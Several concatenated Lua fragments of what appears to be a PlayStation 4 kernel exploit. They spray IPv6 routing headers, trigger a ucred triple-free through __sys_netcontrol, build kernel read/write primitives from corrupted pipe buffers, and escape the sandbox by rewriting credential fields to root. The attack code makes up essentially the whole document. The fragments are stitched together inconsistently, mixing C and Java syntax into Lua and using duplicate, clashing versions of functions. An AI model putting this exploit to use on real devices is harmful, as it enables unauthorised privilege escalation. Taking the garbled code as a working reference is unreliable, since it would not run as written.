    local b1 = string.char((value >> 24) & 0xFF)
    local b2 = string.char((value >> 16) & 0xFF)
    local b3 = string.char((value >> 8) & 0xFF)
    local b4 = string.char(value & 0xFF)
    self.data = self.data:sub(1, offset) .. b1 .. b2 .. b3 .. b4 .. self.data:sub(offset + 4)
end

function Buffer:putLong(offset, value)
    local b1 = string.char((value >> 56) & 0xFF)
    local b2 = string.char((value >> 48) & 0xFF)
    local b3 = string.char((value >> 40) & 0xFF)
    local b4 = string.char((value >> 32) & 0xFF)
    local b5 = string.char((value >> 24) & 0xFF)
    local b6 = string.char((value >> 16) & 0xFF)
    local b7 = string.char((value >> 8) & 0xFF)
    local b8 = string.char(value & 0xFF)
    self.data = self.data:sub(1, offset) .. b1 .. b2 .. b3 .. b4 .. b5 .. b6 .. b7 .. b8 .. self.data:sub(offset + 8)
end

function Buffer:putShort(offset, value)
    local b1 = string.char((value >> 8) & 0xFF)
    local b2 = string.char(value & 0xFF)
    self.data = self.data:sub(1, offset) .. b1 .. b2 .. self.data:sub(offset + 2)
end

function Buffer:getInt(offset)
    local b1 = string.byte(self.data, offset + 1)
    local b2 = string.byte(self.data, offset + 2)
    local b3 = string.byte(self.data, offset + 3)
    local b4 = string.byte(self.data, offset + 4)
    return (b1 << 24) | (b2 << 16) | (b3 << 8) | b4
end

function Buffer:getLong(offset)
    local b1 = string.byte(self.data, offset + 1)
    local b2 = string.byte(self.data, offset + 2)
    local b3 = string.byte(self.data, offset + 3)
    local b4 = string.byte(self.data, offset + 4)
    local b5 = string.byte(self.data, offset + 5)
    local b6 = string.byte(self.data, offset + 6)
    local b7 = string.byte(self.data, offset + 7)
    local b8 = string.byte(self.data, offset + 8)
    return (b1 << 56) | (b2 << 48) | (b3 << 40) | (b4 << 32) | (b5 << 24) | (b6 << 16) | (b7 << 8) | b8
end

function Buffer:getShort(offset)
    local b1 = string.byte(self.data, offset + 1)
    local b2 = string.byte(self.data, offset + 2)
    return (b1 << 8) | b2
end

function Buffer:address()
    return self.data
end

local function sched_yield()
    return Helper.syscall(0)
end

local function __sys_netcontrol(ifindex, cmd, buf, size)
    return Helper.syscall(1, ifindex, cmd, buf ~= nil and buf:address() or 0, size)
end

local function cpusetSetAffinity(core)
    local mask = Buffer:new(0x10)
    mask:putShort(0x00, bit.lshift(1, core))
    return cpuset_setaffinity(3, 1, 0xFFFFFFFFFFFFFFFF, 0x10, mask)
end

local function cpuset_setaffinity(level, which, id, setsize, mask)
    return Helper.syscall(2, level, which, id, setsize, mask ~= nil and mask:address() or 0)
end

local function cleanup()
    for i = 1, #ipv6Socks do
        close(ipv6Socks[i])
    end
    close(uioSs1)
    close(uioSs0)
    close(iovSs1)
    close(iovSs0)
    for i = 1, #iovThreads do
        if iovThreads[i] ~= nil then
            iovThreads[i]:interrupt()
            -- try
            --     iovThreads[i]:join()
            -- catch (Exception e) {}
        end
    end
    for i = 1, #uioThreads do
        if uioThreads[i] ~= nil then
            uioThreads[i]:interrupt()
            -- try
            --     uioThreads[i]:join()
            -- catch (Exception e) {}
        end
    end
    if previousCore >= 0 and previousCore ~= 4 then
        --console.println("back to core " + previousCore)
        Helper.pinToCore(previousCore)
        previousCore = -1
    end
end

local function buildRthdr(buf, size)
    local len = bit.band(bit.rshift(size, 3) - 1, bit.bnot(1))
    buf:putByte(0x00, 0) -- ip6r_nxt
    buf:putByte(0x01, len) -- ip6r_len
    buf:putByte(0x02, IPV6_RTHDR_TYPE_0) -- ip6r_type
    buf:putByte(0x03, bit.rshift(len, 1)) -- ip6r_segleft
    return bit.lshift(len + 1, 3)
end

local function getRthdr(s, buf, len)
    return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
end

local function setRthdr(s, buf, len)
    return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
end

local function freeRthdr(s)
    return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, nil, 0)
end

local function buildUio(uio, uio_iov, uio_td, read, addr, size)
    uio:putLong(0x00, uio_iov) -- uio_iov
    uio:putLong(0x08, UIO_IOV_NUM) -- uio_iovcnt
    uio:putLong(0x10, 0xFFFFFFFFFFFFFFFF) -- uio_offset
    uio:putLong(0x18, size) -- uio_resid
    uio:putInt(0x20, UIO_SYSSPACE) -- uio_segflg
    uio:putInt(0x24, read and UIO_WRITE or UIO_READ) -- uio_segflg
    uio:putLong(0x28, uio_td) -- uio_td
    uio:putLong(0x30, addr) -- iov_base
    uio:putLong(0x38, size) -- iov_len
end

local function kreadSlow(addr, size)
    local leakBuffers = {}
    for i = 1, UIO_THREAD_NUM do
        leakBuffers[i] = Buffer:new(size)
    end
    local bufSize = Int32:new(size)
    setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize:size())
    write(uioSs1, tmp, size)
    uioIovRead:putLong(0x08, size)
    freeRthdr(ipv6Socks[triplets[2]])
    while true do
        uioState:signalWork(COMMAND_UIO_READ)
        sched_yield()
        leakRthdrLen:set(0x10)
        getRthdr(ipv6Socks[triplets[1]], leakRthdr, leakRthdrLen)
        if leakRthdr:getInt(0x08) == UIO_IOV_NUM then
            break
        end
        read(uioSs0, tmp, size)
        for i = 1, UIO_THREAD_NUM do
            read(uioSs0, leakBuffers[i], leakBuffers[i].size)
        end
        uioState:waitForFinished()
        write(uioSs1, tmp, size)
    end
    local uio_iov = leakRthdr:getLong(0x00)
    buildUio(msgIov, uio_iov, 0, true, addr, size)
    freeRthdr(ipv6Socks[triplets[3]])
    while true do
        iovState:signalWork(0)
        sched_yield()
        leakRthdrLen:set(0x40)
        getRthdr(ipv6Socks[triplets[1]], leakRthdr, leakRthdrLen)
        if leakRthdr:getInt(0x20) == UIO_SYSSPACE then
            break
        end
        write(iovSs1, tmp, Int8.SIZE)
        iovState:waitForFinished()
        read(iovSs0, tmp, Int8.SIZE)
    end
    read(uioSs0, tmp, size)
    local leakBuffer = nil
    for i = 1, UIO_THREAD_NUM do
        read(uioSs0, leakBuffers[i], leakBuffers[i].size)
        if leakBuffers[i]:getLong(0x00) ~= 0x4141414141414141 then
            triplets[2] = findTriplet(triplets[1], -1, UAF_TRIES)
            if triplets[2] == -1 then
                console.println("kreadSlow triplet failure 1")
                return nil
            end
            leakBuffer = leakBuffers[i]
        end
    end
    uioState:waitForFinished()
    write(iovSs1, tmp, Int8.SIZE)
    triplets[3] = findTriplet(triplets[1], triplets[2], UAF_TRIES)
    if triplets[3] == -1 then
        console.println("kreadSlow triplet failure 2")
        return nil
    end
    iovState:waitForFinished()
    read(iovSs0, tmp, Int8.SIZE)
    return leakBuffer
end

local function kwriteSlow(addr, buffer)
    local bufSize = Int32:new(buffer.size)
    setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize:size())
    uioIovWrite:putLong(0x08, buffer.size)
    freeRthdr(ipv6Socks[triplets[2]])
    while true do
        uioState:signalWork(COMMAND_UIO_WRITE)
        sched_yield()
        leakRthdrLen:set(0x10)
        getRthdr(ipv6Socks[triplets[1]], leakRthdr, leakRthdrLen)
        if leakRthdr:getInt(0x08) == UIO_IOV_NUM then
            break
        end
        for i = 1, UIO_THREAD_NUM do
            write(uioSs1, buffer, buffer.size)
        end
        uioState:waitForFinished()
    end
    local uio_iov = leakRthdr:getLong(0x00)
    buildUio(msgIov, uio_iov, 0, false, addr, buffer.size)
    freeRthdr(ipv6Socks[triplets[3]])
    while true do
        iovState:signalWork(0)
        sched_yield()
        leakRthdrLen:set(0x40)
        getRthdr(ipv6Socks[triplets[1]], leakRthdr, leakRthdrLen)
        if leakRthdr:getInt(0x20) == UIO_SYSSPACE then
            break
        end
        write(iovSs1, tmp, Int8.SIZE)
        iovState:waitForFinished()
        read(iovSs0, tmp, Int8.SIZE)
    end
    for i = 1, UIO_THREAD_NUM do
        write(uioSs1, buffer, buffer.size)
    end
    triplets[2] = findTriplet(triplets[1], -1, UAF_TRIES)
    if triplets[2] == -1 then
        console.println("kwriteSlow triplet failure 1")
        return false
    end
    uioState:waitForFinished()
    write(iovSs1, tmp, Int8.SIZE)
    triplets[3] = findTriplet(triplets[1], triplets[2], UAF_TRIES)
    if triplets[3] == -1 then
        console.println("kwriteSlow triplet failure 2")
        return false
    end
    iovState:waitForFinished()
    read(iovSs0, tmp, Int8.SIZE)
    return true
end

local function performSetup()
    -- try
        api = API.getInstance()

        dup = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "dup")
        close = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "close")
        read = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "read")
```

```lua
Helper.dup = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "dup")
Helper.close = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "close")
Helper.read = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "read")
Helper.readv = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "readv")
Helper.write = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "write")
Helper.writev = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "writev")
Helper.ioctl = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "ioctl")
Helper.fcntl = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "fcntl")
Helper.pipe = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "pipe")
Helper.kqueue = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "kqueue")
Helper.socket = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "socket")
Helper.socketpair = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "socketpair")
Helper.recvmsg = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "recvmsg")
Helper.getsockopt = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "getsockopt")
Helper.setsockopt = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "setsockopt")
Helper.setuid = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "setuid")
Helper.getpid = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "getpid")
Helper.sched_yield = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "sched_yield")
Helper.cpuset_setaffinity = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "cpuset_setaffinity")
Helper.__sys_netcontrol = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "__sys_netcontrol")

if Helper.dup == 0 or Helper.close == 0 or Helper.read == 0 or Helper.readv == 0 or Helper.write == 0 or Helper.writev == 0  or Helper.ioctl == 0 or Helper.fcntl == 0 or Helper.pipe == 0 or Helper.kqueue == 0 or Helper.socket == 0 or Helper.socketpair == 0 or
   Helper.recvmsg == 0 or Helper.getsockopt == 0 or Helper.setsockopt == 0 or Helper.setuid == 0 or Helper.getpid == 0 or Helper.sched_yield == 0 or Helper.__sys_netcontrol == 0 or Helper.cpuset_setaffinity == 0 then
    console.println("failed to resolve symbols")
    return false
end

-- Prepare spray buffer.
sprayRthdrLen = Exploit.buildRthdr(sprayRthdr, UCRED_SIZE)

-- Prepare msg iov buffer.
msg:putLong(0x10, msgIov.address) -- msg_iov
msg:putLong(0x18, MSG_IOV_NUM) -- msg_iovlen

dummyBuffer:fill(string.char(0x41))
uioIovRead:putLong(0x00, dummyBuffer.address)
uioIovWrite:putLong(0x00, dummyBuffer.address)

-- affinity
previousCore = Helper.getCurrentCore()

if Exploit.cpusetSetAffinity(4) ~= 0 then
    console.println("failed to pin to core")
    return false
end

if not Helper.setRealtimePriority(256) then
    console.println("failed realtime priority")
    return false
end

-- Create socket pair for uio spraying.
Exploit.socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs)
uioSs0 = uioSs[1]
uioSs1 = uioSs[2]

-- Create socket pair for iov spraying.
Exploit.socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs)
iovSs0 = iovSs[1]
iovSs1 = iovSs[2]

-- Create iov threads.
for i = 1, IOV_THREAD_NUM do
    iovThreads[i] = IovThread:new(iovState)
    iovThreads[i]:start()
end

-- Create uio threads.
for i = 1, UIO_THREAD_NUM do
    uioThreads[i] = UioThread:new(uioState)
    uioThreads[i]:start()
end

-- Set up sockets for spraying.
for i = 1, #ipv6Socks do
    ipv6Socks[i] = Exploit.socket(AF_INET6, SOCK_STREAM, 0)
end

-- Initialize pktopts.
for i = 1, #ipv6Socks do
    Exploit.freeRthdr(ipv6Socks[i])
end

-- init pipes
Exploit.pipe(masterPipeFd)
Exploit.pipe(victimPipeFd)

masterRpipeFd = masterPipeFd[1]
masterWpipeFd = masterPipeFd[2]
victimRpipeFd = victimPipeFd[1]
victimWpipeFd = victimPipeFd[2]

Helper.fcntl(masterRpipeFd, F_SETFL, O_NONBLOCK)
Helper.fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK)
Helper.fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK)
Helper.fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK)

return true
-- Error handling
end)

    console.println("exception during performSetup")
    return false

-- Exploit.findTwins
function Exploit.findTwins(timeout)
    while timeout > 0 do
        for i = 1, #ipv6Socks do
            sprayRthdr:putInt(0x04, RTHDR_TAG + i)
            Exploit.setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen)
        end

        for i = 1, #ipv6Socks do
            leakRthdrLen:set(Int64.SIZE)
            Exploit.getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen)
            local val = leakRthdr:getInt(0x04)
            local j = bit.band(val, 0xFFFF)
            if bit.band(val, 0xFFFF0000) == RTHDR_TAG and i ~= j then
                twins[1] = i
                twins[2] = j
                return true
            end
        end
        timeout = timeout - 1
    end
    return false
end

-- Exploit.findTriplet
function Exploit.findTriplet(master, other, timeout)
    while timeout > 0 do
        for i = 1, #ipv6Socks do
            if i == master or i == other then
                goto continue
            end
            sprayRthdr:putInt(0x04, RTHDR_TAG + i)
            Exploit.setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen)
            ::continue::
        end

        for i = 1, #ipv6Socks do
            if i == master or i == other then
                goto continue2
            end
            leakRthdrLen:set(Int64.SIZE)
            Exploit.getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen)
            local val = leakRthdr:getInt(0x04)
            local j = bit.band(val, 0xFFFF)
            if bit.band(val, 0xFFFF0000) == RTHDR_TAG and j ~= master and j ~= other then
                return j
            end
            ::continue2::
        end
        timeout = timeout - 1
    end
    return -1
end

-- Exploit.kreadSlow64
function Exploit.kreadSlow64(address)
    return Exploit.kreadSlow(address, Int64.SIZE):getLong(0x00)
end

-- Exploit.fhold
function Exploit.fhold(fp)
    Exploit.kwrite32(fp + 0x28, Exploit.kread32(fp + 0x28) + 1) -- f_count
end

-- Exploit.fget
function Exploit.fget(fd)
    return Exploit.kread64(fdt_ofiles + fd * FILEDESCENT_SIZE)
end

-- Exploit.removeRthrFromSocket
function Exploit.removeRthrFromSocket(fd)
    local fp = Exploit.fget(fd)
    local f_data = Exploit.kread64(fp + 0x00)
    local so_pcb = Exploit.kread64(f_data + 0x18)
    local in6p_outputopts = Exploit.kread64(so_pcb + 0x118)
    Exploit.kwrite64(in6p_outputopts + 0x68, 0) -- ip6po_rhi_rthdr
end

-- Exploit.corruptPipebuf
function Exploit.corruptPipebuf(cnt, in_offset, out_offset, size, buffer)
    if buffer == 0 then
        error("buffer cannot be zero")
    end
    victimPipebuf:putInt(0x00, cnt) -- cnt
    victimPipebuf:putInt(0x04, in_offset) -- in
    victimPipebuf:putInt(0x08, out_offset) -- out
    victimPipebuf:putInt(0x0C, size) -- size
    victimPipebuf:putLong(0x10, buffer) -- buffer
    Helper.write(masterWpipeFd, victimPipebuf, victimPipebuf.size)
    return Helper.read(masterRpipeFd, victimPipebuf, victimPipebuf.size)
end

-- Exploit.kread
function Exploit.kread(dest, src, n)
    Exploit.corruptPipebuf(n, 0, 0, PAGE_SIZE, src)
    return Helper.read(victimRpipeFd, dest, n)
end

-- Exploit.kwrite
function Exploit.kwrite(dest, src, n)
    Exploit.corruptPipebuf(0, 0, 0, PAGE_SIZE, dest)
    return Helper.write(victimWpipeFd, src, n)
end

-- Exploit.kwrite32
function Exploit.kwrite32(addr, val)
    tmp:putInt(0x00, val)
    Exploit.kwrite(addr, tmp, Int32.SIZE)
end
```

```lua
Helper.kwrite64 = function(addr, val)
  tmp:putLong(0x00, val)
  Helper.kwrite(addr, tmp, Int64.SIZE)
end

Helper.kread64 = function(addr)
  Helper.kread(tmp, addr, Int64.SIZE)
  return tmp:getLong(0x00)
end

Helper.kread32 = function(addr)
  Helper.kread(tmp, addr, Int32.SIZE)
  return tmp:getInt(0x00)
end

local removeUafFile = function()
  local uafFile = Helper.fget(uafSock)
  Helper.kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0)
  local removed = 0
  local ss = Int32Array(2)
  for i = 0, UAF_TRIES - 1 do
    local s = Helper.socket(AF_UNIX, SOCK_STREAM, 0)
    if Helper.fget(s) == uafFile then
      Helper.kwrite64(fdt_ofiles + s * FILEDESCENT_SIZE, 0)
      removed = removed + 1
    end
    Helper.close(s)
    if removed == 3 then
      break
    end
  end
end

local achieveRw = function(timeout)
  -- Free one.
  Helper.freeRthdr(ipv6Socks[triplets[2]])

  -- Leak kqueue.
  local kq = 0
  while timeout > 0 do
    timeout = timeout - 1
    kq = Helper.kqueue()

    -- Leak with other rthdr.
    leakRthdrLen:set(0x100)
    Helper.getRthdr(ipv6Socks[triplets[1]], leakRthdr, leakRthdrLen)
    if leakRthdr:getLong(0x08) == 0x1430000 and leakRthdr:getLong(0x98) ~= 0 then
      break
    end
    Helper.close(kq)
  end

  if timeout <= 0 then
    console:println("kqueue realloc failed")
    return false
  end

  kl_lock = leakRthdr:getLong(0x60)
  kq_fdp = leakRthdr:getLong(0x98)
  Helper.close(kq)

  -- Find triplet.
  triplets[3] = Helper.findTriplet(triplets[1], triplets[3], UAF_TRIES)
  if triplets[3] == -1 then
    console:println("kqueue triplets 1 failed ")
    return false
  end

  local fd_files = Helper.kreadSlow64(kq_fdp)
  fdt_ofiles = fd_files + 0x00

  local masterRpipeFile = Helper.kreadSlow64(fdt_ofiles + masterPipeFd:get(0) * FILEDESCENT_SIZE)
  local victimRpipeFile = Helper.kreadSlow64(fdt_ofiles + victimPipeFd:get(0) * FILEDESCENT_SIZE)
  local masterRpipeData = Helper.kreadSlow64(masterRpipeFile + 0x00)
  local victimRpipeData = Helper.kreadSlow64(victimRpipeFile + 0x00)

  local masterPipebuf = Buffer(PIPEBUF_SIZE)
  masterPipebuf:putInt(0x00, 0) -- cnt
  masterPipebuf:putInt(0x04, 0) -- in
  masterPipebuf:putInt(0x08, 0) -- out
  masterPipebuf:putInt(0x0C, PAGE_SIZE) -- size
  masterPipebuf:putLong(0x10, victimRpipeData) -- buffer
  Helper.kwriteSlow(masterRpipeData, masterPipebuf)

  Helper.fhold(Helper.fget(masterPipeFd:get(0)))
  Helper.fhold(Helper.fget(masterPipeFd:get(1)))
  Helper.fhold(Helper.fget(victimPipeFd:get(0)))
  Helper.fhold(Helper.fget(victimPipeFd:get(1)))

  for i = 1, #triplets do
    Helper.removeRthrFromSocket(ipv6Socks[triplets[i]])
  end

  removeUafFile()
  return true
end

Helper.pfind = function(pid)
  local p = Helper.kread64(allproc)
  while p ~= 0 do
    if Helper.kread32(p + 0xb0) == pid then
      break
    end
    p = Helper.kread64(p + 0x00) -- p_list.le_next
  end
  return p
end

local getPrison0 = function()
  local p = Helper.pfind(0)
  local p_ucred = Helper.kread64(p + 0x40)
  local prison0 = Helper.kread64(p_ucred + 0x30)
  return prison0
end

local getRootVnode = function(i)
  local p = Helper.pfind(0)
  local p_fd = Helper.kread64(p + 0x48)
  local rootvnode = Helper.kread64(p_fd + i)
  return rootvnode
end

local escapeSandbox = function()
  -- get curproc
  local pipeFd = Int32Array(2)
  Helper.pipe(pipeFd)
  
  local currPid = Int32()
  local curpid = Helper.getpid()
  currPid:set(curpid)
  Helper.ioctl(pipeFd:get(0), 0x8004667CL, currPid:address())

  local fp = Helper.fget(pipeFd:get(0))
  local f_data = Helper.kread64(fp + 0x00)
  local pipe_sigio = Helper.kread64(f_data + 0xd0)
  local curproc = Helper.kread64(pipe_sigio)
  local p = curproc

  -- get allproc
  while (p & 0xFFFFFFFF00000000) ~= 0xFFFFFFFF00000000 do
    p = Helper.kread64(p + 0x08) -- p_list.le_prev
  end

  allproc = p

  Helper.close(pipeFd:get(1))
  Helper.close(pipeFd:get(0))

  kBase = kl_lock - KernelOffset:getPS4Offset("KL_LOCK")

  local OFFSET_P_UCRED = 0x40
  local procFd = Helper.kread64(curproc + KernelOffset.PROC_FD)
  local ucred = Helper.kread64(curproc + OFFSET_P_UCRED)
  
  if (procFd >>> 48) ~= 0xFFFF then
    console:print("bad procfd")
    return false
  end
  if (ucred >>> 48) ~= 0xFFFF then
    console:print("bad ucred")
    return false
  end
  
  Helper.kwrite32(ucred + 0x04, 0) -- cr_uid
  Helper.kwrite32(ucred + 0x08, 0) -- cr_ruid
  Helper.kwrite32(ucred + 0x0C, 0) -- cr_svuid
  Helper.kwrite32(ucred + 0x10, 1) -- cr_ngroups
  Helper.kwrite32(ucred + 0x14, 0) -- cr_rgid

  local prison0 = getPrison0()
  if (prison0 >>> 48) ~= 0xFFFF then
    console:print("bad prison0")
    return false
  end
  Helper.kwrite64(ucred + 0x30, prison0)

  -- Add JIT privileges
  Helper.kwrite64(ucred + 0x60, -1)
  Helper.kwrite64(ucred + 0x68, -1)

  local rootvnode = getRootVnode(0x10)
  if (rootvnode >>> 48) ~= 0xFFFF then
    console:print("bad rootvnode")
    return false
  end
  Helper.kwrite64(procFd + 0x10, rootvnode) -- fd_rdir
  Helper.kwrite64(procFd + 0x18, rootvnode) -- fd_jdir
  return true
end

local triggerUcredTripleFree = function()
  local setBuf = Buffer(8)
  local clearBuf = Buffer(8)
  msgIov:putLong(0x00, 1) -- iov_base
  msgIov:putLong(0x08, Int8.SIZE) -- iov_len
  local dummySock = Helper.socket(AF_UNIX, SOCK_STREAM, 0)
  setBuf:putInt(0x00, dummySock)
  Helper.__sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf:size())
  Helper.close(dummySock)
  Helper.setuid(1)
  uafSock = Helper.socket(AF_UNIX, SOCK_STREAM, 0)
  Helper.setuid(1)
  clearBuf:putInt(0x00, uafSock)
  Helper.__sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf:size())
  for i = 0, 31 do
    iovState:signalWork(0)
    Helper.sched_yield()
    Helper.write(iovSs1, tmp, Int8.SIZE)
    iovState:waitForFinished()
    Helper.read(iovSs0, tmp, Int8.SIZE)
  end
  Helper.close(Helper.dup(uafSock))
  if not Helper.findTwins(TWIN_TRIES) then
    console:println("twins failed")
    return false
  end

  Helper.freeRthdr(ipv6Socks[twins[2]])
  local timeout = UAF_TRIES
  while timeout > 0 do
    timeout = timeout - 1
    iovState:signalWork(0)
    Helper.sched_yield()
    leakRthdrLen:set(Int64.SIZE)
    Helper.getRthdr(ipv6Socks[twins[1]], leakRthdr, leakRthdrLen)
    if leakRthdr:getInt(0x00) == 1 then
      break
    end
    Helper.write(iovSs1, tmp, Int8.SIZE)
    iovState:waitForFinished()
    Helper.read(iovSs0, tmp, Int8.SIZE)
  end
  if timeout <= 0 then
    console:println("iov reclaim failed")
    return false
  end
```

```lua
local Helper = {}

function Helper.syscall(number, ...)
    local args = {...}
    return Helper.api.call(syscallWrappers[number + 1], table.unpack(args))
end

Poops = {}
Poops.iovState = nil
Poops.uioState = nil
Poops.iovThread = nil
Poops.uioThread = nil
Poops.iovSs0 = nil
Poops.iovSs1 = nil
Poops.uioSs0 = nil
Poops.uioSs1 = nil
Poops.uafSock = nil
Poops.msg = nil
Poops.uioIovRead = nil
Poops.uioIovWrite = nil
Poops.tmp = nil
Poops.pageZero = nil
Poops.kBase = nil
Poops.console = nil
local iovState
local uioState
local iovThread
local uioThread
local iovSs0
local iovSs1
local uioSs0
local uioSs1
local uafSock
local msg
local uioIovRead
local uioIovWrite
local tmp
local pageZero
local kBase

local COMMAND_UIO_READ = 0
local COMMAND_UIO_WRITE = 1
local UIO_IOV_NUM = 2
local KQUEUE_TRIES = 0x1000
local UAF_TRIES = 0x4000

local function performSetup()
    local pageSize = Helper.pageSize
    local PROT_READ = 0x1
    local PROT_WRITE = 0x2
    local PROT_EXEC = 0x4
    local MAP_ANON = 0x1000
    local MAP_SHARED = 0x0001
    local MAP_FIXED = 0x0010

    pageZero = Helper.syscall(Helper.SYS_MMAP, 0, pageSize, PROT_READ + PROT_WRITE, MAP_ANON, -1, 0)
    if (pageZero <= 0) then
        Poops.console.println("mmap pageZero failed")
        return false
    end

    iovState = Poops.WorkerState.new(1)
    uioState = Poops.WorkerState.new(1)

    iovThread = Poops.IovThread.new(iovState)
    uioThread = Poops.UioThread.new(uioState)

    iovThread:start()
    uioThread:start()

    iovSs0 = socket(2, 1, 0)
    iovSs1 = socket(2, 1, 0)
    uioSs0 = socket(2, 1, 0)
    uioSs1 = socket(2, 1, 0)
    uafSock = socket(2, 1, 0)

    if (iovSs0 < 0 or iovSs1 < 0 or uioSs0 < 0 or uioSs1 < 0 or uafSock < 0) {
        Poops.console.println("socket failed")
        return false
    }

    Poops.iovSs0 = iovSs0
    Poops.iovSs1 = iovSs1
    Poops.uioSs0 = uioSs0
    Poops.uioSs1 = uioSs1
    Poops.uafSock = uafSock

    local sockaddr_in = {}
    sockaddr_in.sin_family = 2
    sockaddr_in.sin_port = 0xABCD
    sockaddr_in.sin_addr = 0x7F000001

    if (bind(iovSs0, sockaddr_in) < 0 or bind(uioSs0, sockaddr_in) < 0) {
        Poops.console.println("bind failed")
        return false
    }

    if (connect(iovSs1, sockaddr_in) < 0 or connect(uioSs1, sockaddr_in) < 0) {
        Poops.console.println("connect failed")
        return false
    }

    local msghdr = {}
    msghdr.msg_name = 0
    msghdr.msg_namelen = 0
    msghdr.msg_control = 0
    msghdr.msg_controllen = 0
    msghdr.msg_flags = 0

    local iovec = {}
    iovec.iov_base = pageZero
    iovec.iov_len = 1

    msghdr.msg_iov = iovec
    msghdr.msg_iovlen = 1

    msg = msghdr
    Poops.msg = msg

    local iovec_read1 = {}
    iovec_read1.iov_base = pageZero
    iovec_read1.iov_len = 1
    local iovec_read2 = {}
    iovec_read2.iov_base = pageZero
    iovec_read2.iov_len = 1
    uioIovRead = {iovec_read1, iovec_read2}
    Poops.uioIovRead = uioIovRead

    local iovec_write1 = {}
    iovec_write1.iov_base = pageZero
    iovec_write1.iov_len = 1
    local iovec_write2 = {}
    iovec_write2.iov_base = pageZero
    iovec_write2.iov_len = 1
    uioIovWrite = {iovec_write1, iovec_write2}
    Poops.uioIovWrite = uioIovWrite

    tmp = Helper.alloc(1)
    Poops.tmp = tmp

    return true
end

local function cleanup()
    if (iovThread ~= nil) then
        iovThread:interrupt()
        iovThread:join()
        iovThread = nil
        Poops.iovThread = nil
    end
    if (uioThread ~= nil) then
        uioThread:interrupt()
        uioThread:join()
        uioThread = nil
        Poops.uioThread = nil
    end
    if (iovSs0 ~= nil) then
        close(iovSs0)
        iovSs0 = nil
        Poops.iovSs0 = nil
    end
    if (iovSs1 ~= nil) then
        close(iovSs1)
        iovSs1 = nil
        Poops.iovSs1 = nil
    end
    if (uioSs0 ~= nil) then
        close(uioSs0)
        uioSs0 = nil
        Poops.uioSs0 = nil
    end
    if (uioSs1 ~= nil) then
        close(uioSs1)
        uioSs1 = nil
        Poops.uioSs1 = nil
    end
    if (uafSock ~= nil) then
        close(uafSock)
        uafSock = nil
        Poops.uafSock = nil
    end
    if (pageZero ~= nil) then
        Helper.syscall(Helper.SYS_MUNMAP, pageZero, Helper.pageSize)
        pageZero = nil
        Poops.pageZero = nil
    end
    if (tmp ~= nil) then
        Helper.free(tmp)
        tmp = nil
        Poops.tmp = nil
    end
end

local function triggerUcredTripleFree()
    local uafSock = Poops.uafSock
    local console = Poops.console
    for i = 0, 0x10000 do
        local sock = socket(2, 1, 0)
        if (sock < 0) then
            console.println("sock failed")
            return false
        end
        if (connect(sock, 0x020000017F000001 + (0x2B << 16)) < 0) then
            close(sock)
            break
        end
        close(sock)
    }

    local sockaddr_in = {}
    sockaddr_in.sin_family = 2
    sockaddr_in.sin_port = 0x2B
    sockaddr_in.sin_addr = 0x7F000001

    if (connect(uafSock, sockaddr_in) < 0) {
        console.println("connect uaf sock failed")
        return false
    }

    return true
end

local function findTriplet(start, skip, tries)
    local console = Poops.console
    local uafSock = Poops.uafSock
    local triplets = {}
    for i = 0, tries - 1 do
        local sock = socket(2, 1, 0)
        if (sock < 0) {
            console.println("sock failed")
            return -1
        }
        if (connect(sock, 0x020000017F000001 + (0x2B << 16)) < 0) {
            close(sock)
            console.println("connect failed")
            return -1
        }
        local ptr = Helper.findPort(sock)
        if (ptr == -1) {
            close(sock)
            console.println("find port failed")
            return -1
        }
        if (ptr == start or ptr == skip) {
            close(sock)
            continue
        }
        triplets[#triplets + 1] = ptr
        close(sock)
        if (#triplets == 2) {
            return ptr
        }
    }
    return -1
end

local function achieveRw(tries)
    local console = Poops.console
    local iovState = Poops.iovState
    local uioState = Poops.uioState
    local iovSs0 = Poops.iovSs0
    local iovSs1 = Poops.iovSs1
    local uioSs0 = Poops.uioSs0
    local uioSs1 = Poops.uioSs1
